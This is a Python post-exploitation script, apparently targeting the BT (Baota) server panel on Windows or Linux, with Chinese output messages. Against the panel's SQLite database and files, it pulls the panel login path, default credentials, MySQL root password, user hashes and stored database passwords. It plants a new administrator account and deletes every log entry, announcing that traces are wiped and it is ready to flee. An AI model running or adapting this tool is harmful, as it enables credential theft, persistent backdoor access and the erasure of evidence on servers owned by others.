import sqlite3
from userFunc import *


def getVersionData(item):
    if "0" == item:
        infoDict = {
            'defaultDb': 'C:/BtSoft/panel/data/default.db',
            'adminPath': 'C:/BtSoft/panel/data/admin_path.pl',
            'defaultPasswordPath': 'C:/BtSoft/panel/data/default.pl',
            'apiPath': 'C:/BtSoft/panel/config/api.json',
        }
    elif "1" == item:
        infoDict = {
            'defaultDb': '/www/server/panel/data/default.db',
            'adminPath': '/www/server/panel/data/admin_path.pl',
            'defaultPasswordPath': '/www/server/panel/default.pl',
            'apiPath': '/www/server/panel/config/api.json',
        }
    return infoDict


class btExploit:
    def __init__(self, infoDict):
        self.conn = sqlite3.connect(infoDict['defaultDb'])
        self.cursor = self.conn.cursor()

    def getDefaultInfo(self):
        sql = 'select username from users where id=1'
        defaultUser = dbFetchOne(self.cursor, sql)
        with open(infoDict['defaultPasswordPath'], 'r') as f:
            defaultPass = f.read()
        with open(infoDict['adminPath'], 'r') as f:
            adminPath = f.read()
        res = ''
        res += f"面板地址：{adminPath}  "
        res += f"默认账号：{defaultUser}  "
        res += f"默认密码：{defaultPass}  "
        return res

    def generateHashPass(self, password, salt):
        return md5(md5(md5(password) + '_bt.cn') + salt)

    def get_mysql_root_password(self):
        sql = 'select mysql_root from config'
        return dbFetchOne(self.cursor, sql)

    def insertUser(self, username, password, salt):
        tmpPassword = password
        password = self.generateHashPass(password, salt)
        try:
            sql = f"INSERT INTO users (username,password,salt,email) VALUES ('{username}', '{password}', '{salt}', 'admin@admin.com')"
            self.cursor.execute(sql)
            self.conn.commit()
            return f'插入新用户成功 username:{username},password:{tmpPassword}'
        except sqlite3.OperationalError:
            return 'Write Failed'

    def getUsers(self):
        sql = 'select username, password, salt from users'
        tmp = dbFetchAll(self.cursor, sql)
        res = ''
        for item in tmp:
            res += f'username：{item[0]}, password：{item[1]}, salt：{item[2]}\n'
        return res

    def getDatabaseUsers(self):
        sql = 'select name, username, password from databases'
        tmp = dbFetchAll(self.cursor, sql)
        res = ''
        for item in tmp:
            res += f'name：{item[0]}, username：{item[1]}, password：{item[2]}\n'
        return res

    def delLogs(self):
        sql = "select id from logs"
        cursor = self.cursor.execute(sql)
        for log in cursor.fetchall():
            log_id = log[0]
            sql = f"delete from logs where id = {log_id}"
            self.cursor.execute(sql)
            self.conn.commit()
        self.conn.close()
        printSingleInfo("删除痕迹成功，准备跑路")


if __name__ == '__main__':
    btFunc()
    ver = input('请输入当前所在操作系统(0:windows；1:linux)\n>>')
    infoDict = getVersionData(ver)
    btEXP = btExploit(infoDict)
    printTemplate("面板默认信息", btEXP.getDefaultInfo())
    printTemplate("Mysql-Root密码", btEXP.get_mysql_root_password())
    printSingleInfo(btEXP.insertUser(get_random_string(6), get_random_string(7), get_random_string(12)))
    printTemplate("用户信息", btEXP.getUsers())
    printTemplate("数据库用户信息", btEXP.getDatabaseUsers())
    btEXP.delLogs()
